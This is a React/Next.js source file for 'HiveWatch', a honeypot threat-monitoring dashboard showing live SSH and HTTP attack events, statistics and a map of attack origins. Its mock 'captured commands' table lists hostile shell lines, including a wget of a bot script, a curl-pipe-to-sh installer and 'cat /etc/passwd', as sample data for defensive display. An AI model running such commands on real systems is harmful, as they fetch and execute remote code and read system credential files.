'use client'

import Image from 'next/image'
import { useEffect, useMemo, useRef, useState } from 'react'
import {
  Activity, AlertTriangle, ArrowDownRight, ArrowUpRight, Bell, ChevronRight,
  CircleDot, Command, Database, Globe2, LayoutDashboard, Menu, Pause, Play, Search,
  Settings, Shield, Terminal, Users, X, Zap, type LucideIcon,
} from 'lucide-react'
import {
  Area, AreaChart, CartesianGrid, ResponsiveContainer,
  Tooltip, XAxis, YAxis,
} from 'recharts'
import { ComposableMap, Geographies, Geography, Line, Marker, ZoomableGroup } from 'react-simple-maps'

const WORLD_ATLAS_URL = 'https://cdn.jsdelivr.net/npm/world-atlas@2/countries-110m.json'
// TODO: map markers are mock data for now, not wired to the backend yet.
const HONEYPOT_COORDS: [number, number] = [8.68, 50.11]
const MOCK_ATTACK_ORIGINS: { name: string; coords: [number, number]; kind: 'ssh' | 'http' | 'mixed' }[] = [
  { name: 'China', coords: [104.2, 35.9], kind: 'ssh' },
  { name: 'Russia', coords: [37.6, 55.8], kind: 'mixed' },
  { name: 'United States', coords: [-98.5, 39.8], kind: 'http' },
  { name: 'Vietnam', coords: [108.3, 14.1], kind: 'ssh' },
]

const API_URL = process.env.NEXT_PUBLIC_API_URL ?? 'http://localhost:8000'
const WS_URL = API_URL.replace(/^http/, 'ws') + '/ws/events'
const MAX_LIVE_EVENTS = 50
const MAX_ACTIVITY_BUCKETS = 12

type EnrichedEvent = {
  id: number
  sensor_id: string
  service: string
  event_type: string
  source_ip: string
  session_id: string | null
  payload: Record<string, unknown>
  occurred_at: string
  country: string | null
  city: string | null
  mitre_techniques: string[]
}

type StatsOverview = {
  total_events: number
  unique_attackers: number
  active_sessions: number
  commands_captured: number
  events_by_service: Record<string, number>
}

type CountryCount = { country: string; count: number }

type FeedItem = {
  time: string
  protocol: string
  ip: string
  title: string
  detail: string
  severity: string
}

type ActivityBucket = { time: string; ssh: number; http: number }

// TODO: commands table, top attackers and alerts still use mock data.
const commands = [
  ['wget http://185.xxx.xxx.xxx/bot.sh', 'DOWNLOAD', '1,204', '89', '17:02', '17:18', 'CRITICAL'],
  ['curl -fsSL http://example.com/install.sh | sh', 'MALWARE', '874', '62', '16:41', '17:16', 'HIGH'],
  ['cat /etc/passwd', 'CREDENTIAL ACCESS', '642', '318', '15:22', '17:12', 'HIGH'],
  ['uname -a', 'RECON', '531', '290', '14:09', '17:08', 'LOW'],
  ['chmod +x payload.sh', 'PERSISTENCE', '328', '74', '13:44', '16:59', 'HIGH'],
]

function deriveSeverity(event: EnrichedEvent): string {
  const t = event.mitre_techniques
  if (t.includes('T1110') || t.includes('T1552.001')) return 'CRITICAL'
  if (t.length > 0) return 'HIGH'
  if (event.event_type === 'auth_attempt' || event.event_type === 'http_request') return 'MEDIUM'
  return 'LOW'
}

function describeEvent(event: EnrichedEvent): { title: string; detail: string } {
  const payload = event.payload as Record<string, string>
  switch (event.event_type) {
    case 'auth_attempt':
      return { title: 'Authentication attempt', detail: `username: ${payload.username} · password: ${payload.password}` }
    case 'session_start':
      return { title: 'Session started', detail: `username: ${payload.username}` }
    case 'session_end':
      return { title: 'Session ended', detail: `username: ${payload.username}` }
    case 'command':
      return { title: 'Command executed', detail: payload.command ?? '' }
    case 'http_request':
      return {
        title: `${payload.method} ${payload.path}`,
        detail: event.mitre_techniques.includes('T1595.002') ? 'known scanner target' : 'request received',
      }
    default:
      return { title: event.event_type, detail: '' }
  }
}

function toFeedItem(event: EnrichedEvent): FeedItem {
  const { title, detail } = describeEvent(event)
  return {
    time: new Date(event.occurred_at).toLocaleTimeString('en-GB'),
    protocol: event.service.toUpperCase(),
    ip: event.source_ip,
    title,
    detail,
    severity: deriveSeverity(event),
  }
}

function Logo() { return <div className="logo"><Image src="/logo-hive.png" alt="HiveWatch" width={2172} height={724} priority className="logo-image" /></div> }
function Status({ label, online = true }: { label: string; online?: boolean }) { return <div className="status"><span className={online ? 'dot online' : 'dot'} />{label}<b>{online ? 'ONLINE' : 'OFFLINE'}</b></div> }
function Severity({ value }: { value: string }) { return <span className={`severity ${value.toLowerCase()}`}><span />{value}</span> }
function Card({ children, className = '' }: { children: React.ReactNode; className?: string }) { return <section className={`card ${className}`}>{children}</section> }
function SectionTitle({ icon: Icon, children, action }: { icon: LucideIcon; children: React.ReactNode; action?: React.ReactNode }) { return <div className="section-title"><div><Icon size={15} /><h2>{children}</h2></div>{action}</div> }
function Metric({ icon: Icon, label, value, change, spark }: { icon: LucideIcon; label: string; value: string; change?: string; spark: number[] }) { return <Card className="metric"><div className="metric-top"><span className="metric-icon"><Icon size={16} /></span><span className="metric-label">{label}</span></div><div className="metric-value">{value}</div>{change && <div className="positive"><ArrowUpRight size={13} />{change}</div>}<div className="spark">{spark.map((x, i) => <i key={i} style={{ height: `${x}%` }} />)}</div></Card> }

const MARKER_COLORS: Record<'ssh' | 'http' | 'mixed', string> = { ssh: '#f5c518', http: '#f97316', mixed: '#ad8a1c' }

function AttackMap() {
  return (
    <div className="map">
      <ComposableMap
        projection="geoEqualEarth"
        projectionConfig={{ scale: 142, center: [10, 8] }}
        width={800}
        height={340}
        style={{ width: '100%', height: '100%' }}
      >
        <ZoomableGroup
          minZoom={1}
          maxZoom={8}
          // only zoom on ctrl/cmd + wheel so page scrolling still works
          filterZoomEvent={(event: Event) =>
            event.type !== 'wheel' || (event as WheelEvent).ctrlKey || (event as WheelEvent).metaKey
          }
        >
          <Geographies geography={WORLD_ATLAS_URL}>
            {({ geographies }) =>
              geographies.map(geo => (
                <Geography
                  key={geo.rsmKey}
                  geography={geo}
                  className="land"
                  style={{ outline: 'none' }}
                />
              ))
            }
          </Geographies>
          {MOCK_ATTACK_ORIGINS.map(origin => (
            <Line key={origin.name} from={origin.coords} to={HONEYPOT_COORDS} className="route" />
          ))}
          {MOCK_ATTACK_ORIGINS.map(origin => (
            <Marker key={origin.name} coordinates={origin.coords}>
              <circle r={4} className="marker" style={{ fill: MARKER_COLORS[origin.kind] }} />
            </Marker>
          ))}
          <Marker coordinates={HONEYPOT_COORDS}>
            <circle r={6} className="target" />
          </Marker>
        </ZoomableGroup>
      </ComposableMap>
      <div className="map-hint">DRAG TO PAN · CTRL+SCROLL TO ZOOM</div>
      <div className="map-label target-label">HONEYPOT<br /><b>ACTIVE</b></div>
      <div className="map-legend"><span><i className="ssh-dot" />SSH</span><span><i className="http-dot" />HTTP</span><span><i className="mixed-dot" />MIXED</span></div>
    </div>
  )
}

export default function Page() {
  const [range, setRange] = useState('LAST 24 HOURS'); const [protocol, setProtocol] = useState('ALL'); const [paused, setPaused] = useState(false); const [query, setQuery] = useState(''); const [expanded, setExpanded] = useState<number | null>(null); const [drawer, setDrawer] = useState<string | null>(null)

  const [liveEvents, setLiveEvents] = useState<FeedItem[]>([])
  const [activityBuckets, setActivityBuckets] = useState<ActivityBucket[]>([])
  const [overview, setOverview] = useState<StatsOverview | null>(null)
  const [countries, setCountries] = useState<CountryCount[]>([])
  const pausedRef = useRef(paused)
  pausedRef.current = paused

  // render the map client-side only to avoid hydration mismatches
  const [mounted, setMounted] = useState(false)
  useEffect(() => setMounted(true), [])

  useEffect(() => {
    let cancelled = false
    const loadStats = () => {
      fetch(`${API_URL}/api/stats/overview`).then(res => res.json()).then(data => { if (!cancelled) setOverview(data) }).catch(() => {})
      fetch(`${API_URL}/api/stats/countries?limit=5`).then(res => res.json()).then(data => { if (!cancelled) setCountries(data) }).catch(() => {})
    }
    loadStats()
    const interval = setInterval(loadStats, 10000)
    return () => { cancelled = true; clearInterval(interval) }
  }, [])

  useEffect(() => {
    let cancelled = false
    let socket: WebSocket | null = null

    const connect = () => {
      if (cancelled) return
      socket = new WebSocket(WS_URL)
      socket.onmessage = ev => {
        if (pausedRef.current) return
        const event: EnrichedEvent = JSON.parse(ev.data)

        setLiveEvents(prev => [toFeedItem(event), ...prev].slice(0, MAX_LIVE_EVENTS))

        const bucketLabel = new Date(event.occurred_at).toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' })
        setActivityBuckets(prev => {
          const last = prev[prev.length - 1]
          const isSsh = event.service === 'ssh' ? 1 : 0
          const isHttp = event.service === 'http' ? 1 : 0
          if (last && last.time === bucketLabel) {
            return [...prev.slice(0, -1), { time: bucketLabel, ssh: last.ssh + isSsh, http: last.http + isHttp }]
          }
          return [...prev, { time: bucketLabel, ssh: isSsh, http: isHttp }].slice(-MAX_ACTIVITY_BUCKETS)
        })
      }
      socket.onclose = () => { if (!cancelled) setTimeout(connect, 2000) }
    }
    connect()

    return () => { cancelled = true; socket?.close() }
  }, [])

  const filteredEvents = useMemo(() => liveEvents.filter(e => (!query || e.ip.includes(query) || e.title.toLowerCase().includes(query.toLowerCase())) && (protocol === 'ALL' || e.protocol === protocol)), [liveEvents, query, protocol])

  const sshCount = overview?.events_by_service.ssh ?? 0
  const httpCount = overview?.events_by_service.http ?? 0

  return <div className="app-shell"><aside className="sidebar"><Logo /><nav><p>COMMAND CENTER</p>{[['Overview', LayoutDashboard], ['Live Activity', Activity], ['SSH Honeypot', Terminal], ['HTTP Honeypot', Globe2], ['Attackers', Users], ['Commands', Command], ['Requests', Zap]].map(([label, Icon], i) => <button className={i === 0 ? 'nav-item active' : 'nav-item'} key={label as string}><Icon size={16} />{label as string}{label === 'Live Activity' && <em>LIVE</em>}</button>)}<p>INTELLIGENCE</p>{[['Threat Intelligence', Shield], ['Geographic Activity', Globe2], ['Alerts', Bell], ['Logs', Database]].map(([label, Icon]) => <button className="nav-item" key={label as string}><Icon size={16} />{label as string}</button>)}</nav><div className="system"><p>SYSTEM STATUS</p><Status label="SSH Honeypot" /><Status label="HTTP Honeypot" /><Status label="Collector" /><Status label="Database" /></div><button className="settings"><Settings size={15} /> Settings</button></aside><main className="main"><header><div><div className="breadcrumb">HIVEWATCH <span>/</span> OVERVIEW</div><h1>Threat operations center</h1></div><div className="header-actions"><span className="live"><i className="dot online" />LIVE</span><span className="updated">Connected to {API_URL}</span><button className="icon-btn" aria-label="Search"><Search size={17} /></button><button className="icon-btn" aria-label="Notifications"><Bell size={17} /><b className="notification-dot" /></button><select value={range} onChange={e => setRange(e.target.value)} aria-label="Time range">{['LAST 15 MINUTES', 'LAST HOUR', 'LAST 24 HOURS', 'LAST 7 DAYS', 'LAST 30 DAYS'].map(x => <option key={x}>{x}</option>)}</select></div></header><div className="mobile-bar"><Logo /><Menu size={20} /></div><div className="metrics"><Metric icon={Activity} label="TOTAL ATTACKS" value={overview ? overview.total_events.toLocaleString() : '—'} spark={[]} /><Metric icon={Users} label="UNIQUE ATTACKERS" value={overview ? overview.unique_attackers.toLocaleString() : '—'} spark={[]} /><Metric icon={Terminal} label="SSH ATTEMPTS" value={sshCount.toLocaleString()} spark={[]} /><Metric icon={Globe2} label="HTTP REQUESTS" value={httpCount.toLocaleString()} spark={[]} /><Metric icon={Command} label="COMMANDS CAPTURED" value={overview ? overview.commands_captured.toLocaleString() : '—'} spark={[]} /><Metric icon={AlertTriangle} label="ACTIVE SESSIONS" value={overview ? overview.active_sessions.toLocaleString() : '—'} spark={[]} /></div><div className="dashboard-grid top-grid"><Card className="activity-card"><SectionTitle icon={Activity} action={<div className="tabs">{['ALL', 'SSH', 'HTTP'].map(x => <button className={protocol === x ? 'selected' : ''} onClick={() => setProtocol(x)} key={x}>{x}</button>)}</div>}>ATTACK ACTIVITY <span className="subtle">/since page opened</span></SectionTitle><div className="chart">{activityBuckets.length > 0 ? <ResponsiveContainer width="100%" height="100%"><AreaChart data={activityBuckets}><defs><linearGradient id="amberFill" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#f5c518" stopOpacity={0.25} /><stop offset="100%" stopColor="#f5c518" stopOpacity={0} /></linearGradient></defs><CartesianGrid stroke="#2a2a2a" vertical={false} /><XAxis dataKey="time" tick={{ fill: '#777', fontSize: 10 }} axisLine={false} tickLine={false} /><YAxis tick={{ fill: '#777', fontSize: 10 }} axisLine={false} tickLine={false} width={30} allowDecimals={false} /><Tooltip contentStyle={{ background: '#191919', border: '1px solid #3a3a3a', fontSize: 11 }} /><Area type="monotone" dataKey="ssh" name="SSH attacks" stroke="#f5c518" fill="url(#amberFill)" strokeWidth={2} /><Area type="monotone" dataKey="http" name="HTTP requests" stroke="#d99f00" fill="transparent" strokeWidth={1.5} /></AreaChart></ResponsiveContainer> : <div className="empty-hint">No activity yet this session — SSH into port 2222 or curl the honeypot to see it appear live.</div>}</div><div className="chart-foot"><span><i className="line-amber" />SSH attacks</span><span><i className="line-gold" />HTTP requests</span><b><CircleDot size={12} /> {overview?.active_sessions ?? 0} active sessions</b></div></Card><Card className="feed"><SectionTitle icon={Zap} action={<button className="pause" onClick={() => setPaused(!paused)}>{paused ? <Play size={13} /> : <Pause size={13} />}{paused ? 'RESUME' : 'PAUSE'}</button>}>LIVE ATTACK FEED</SectionTitle><div className="feed-status"><span className="dot online" />{paused ? 'Feed paused' : 'Streaming events'}<span>{liveEvents.length} events</span></div><div className="event-list">{filteredEvents.length === 0 && <div className="empty-hint">No events yet — SSH into port 2222 or curl a bait path to see live activity.</div>}{filteredEvents.map((e, i) => <div className={`event ${expanded === i ? 'expanded' : ''}`} key={`${e.time}-${i}`} onClick={() => setExpanded(expanded === i ? null : i)}><time>{e.time}</time><span className={`protocol ${e.protocol.toLowerCase()}`}>{e.protocol}</span><button className="ip" onClick={ev => { ev.stopPropagation(); setDrawer(e.ip) }}>{e.ip}</button><div className="event-copy"><strong>{e.title}</strong><small>{e.detail}</small>{expanded === i && <small className="event-extra">Sensor: {e.protocol === 'SSH' ? 'ssh-listener-01' : 'web-trap-02'} · session correlation enabled</small>}</div><Severity value={e.severity} /><ChevronRight size={14} className="chevron" /></div>)}</div></Card></div><div className="dashboard-grid map-grid"><Card><SectionTitle icon={Globe2} action={<span className="live-count"><i className="dot online" /> {countries.length} sources active</span>}>GLOBAL ATTACK ORIGINS</SectionTitle>{mounted ? <AttackMap /> : <div className="map" />}</Card><Card className="sources"><SectionTitle icon={ArrowDownRight}>TOP ATTACK SOURCES</SectionTitle>{countries.length === 0 && <div className="empty-hint">No geo data yet — add a GeoLite2-City.mmdb to enable country lookups.</div>}{countries.map((c, i) => <div className="source" key={c.country}><span className="rank">0{i + 1}</span><div><div className="source-row"><b>{c.country}</b><span>{c.count.toLocaleString()}</span></div><div className="bar"><i style={{ width: `${(c.count / countries[0].count) * 100}%` }} /></div></div></div>)}</Card></div><div className="dashboard-grid analytics-grid"><Card><SectionTitle icon={Terminal}>SSH HONEYPOT <span className="status-chip">● LISTENER ONLINE</span></SectionTitle><div className="mini-stats"><div><b>{sshCount.toLocaleString()}</b><span>EVENTS</span></div><div><b>{overview?.unique_attackers ?? 0}</b><span>UNIQUE IPS</span></div><div><b>{overview?.active_sessions ?? 0}</b><span>ACTIVE</span></div></div></Card><Card><SectionTitle icon={Globe2}>HTTP HONEYPOT <span className="status-chip">● LISTENER ONLINE</span></SectionTitle><div className="mini-stats"><div><b>{httpCount.toLocaleString()}</b><span>REQUESTS</span></div><div><b>{overview?.unique_attackers ?? 0}</b><span>UNIQUE IPS</span></div></div></Card></div><Card className="commands"><SectionTitle icon={Command}>CAPTURED COMMANDS <span className="subtle">mock data</span></SectionTitle><div className="table-wrap"><table><thead><tr><th>COMMAND</th><th>RISK</th><th>EXECUTIONS</th><th>UNIQUE ATTACKERS</th><th>FIRST SEEN</th><th>LAST SEEN</th></tr></thead><tbody>{commands.map(c=><tr key={c[0]}><td><code>{c[0]}</code></td><td><Severity value={c[6]} /></td><td>{c[2]}</td><td>{c[3]}</td><td>{c[4]}</td><td>{c[5]}</td></tr>)}</tbody></table></div></Card><div className="dashboard-grid bottom-grid"><Card><SectionTitle icon={Users} action={<button className="link-btn">VIEW ALL <ChevronRight size={13} /></button>}>TOP ATTACKERS <span className="subtle">mock data</span></SectionTitle><div className="table-wrap"><table><thead><tr><th>IP ADDRESS</th><th>COUNTRY</th><th>ATTACKS</th><th>SERVICES</th><th>SCORE</th></tr></thead><tbody>{[['185.220.101.45','Russia','2,481','SSH','94'],['45.155.205.233','United States','1,892','SSH + HTTP','87'],['103.42.11.8','Vietnam','1,421','SSH','81']].map(r=><tr key={r[0]}><td><button className="ip" onClick={() => setDrawer(r[0])}>{r[0]}</button></td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td><b className="score">{r[4]}</b></td></tr>)}</tbody></table></div></Card><Card><SectionTitle icon={AlertTriangle}>SECURITY ALERTS <span className="subtle">mock data</span></SectionTitle>{[['CRITICAL','Possible malware deployment detected','SSH / 185.220.101.45'],['HIGH','Repeated credential stuffing detected','HTTP / 91.92.14.22'],['MEDIUM','Unusual command sequence detected','SSH / 103.42.11.8']].map(a=><div className="alert" key={a[1]}><Severity value={a[0]} /><div><b>{a[1]}</b><small>{a[2]} · 2 min ago</small></div><button>VIEW</button></div>)}</Card></div><Card className="infra"><SectionTitle icon={Database}>HONEYPOT INFRASTRUCTURE <span className="subtle">SYSTEM HEALTH 99.98%</span></SectionTitle><div className="infra-grid">{['SSH Listener','HTTP Listener','Event Collector','Database','Threat Analyzer'].map(x=><Status key={x} label={x} />)}<div className="infra-stat"><span>EVENT INGESTION</span><b>142 <small>events/sec</small></b></div><div className="infra-stat"><span>AVG PROCESSING LATENCY</span><b>38 <small>ms</small></b></div></div></Card></main>{drawer && <div className="drawer-backdrop" onClick={() => setDrawer(null)}><aside className="drawer" onClick={e => e.stopPropagation()}><button className="drawer-close" onClick={() => setDrawer(null)}><X size={18} /></button><div className="drawer-kicker"><Shield size={16} /> THREAT PROFILE</div><h2>{drawer}</h2><p className="country-line"><span className="dot critical" /> Russia · AS24940</p><div className="threat-score"><span>THREAT SCORE</span><b>94</b><div><i style={{width:'94%'}} /></div></div><div className="drawer-stats"><div><b>2,481</b><span>TOTAL ATTACKS</span></div><div><b>1,892</b><span>SSH ATTEMPTS</span></div><div><b>589</b><span>HTTP REQUESTS</span></div><div><b>37</b><span>COMMANDS</span></div></div><h3>ACTIVITY TIMELINE</h3>{['17:18:42 · Failed authentication','17:16:09 · Payload download','17:02:31 · Port scan detected','16:48:11 · New session opened'].map(x=><div className="timeline" key={x}><i /><span>{x}</span></div>)}<button className="primary-btn" onClick={() => window.open(`${API_URL}/api/events?ip=${drawer}`, '_blank')}>VIEW RAW EVENTS FOR THIS IP</button></aside></div>}</div>
}
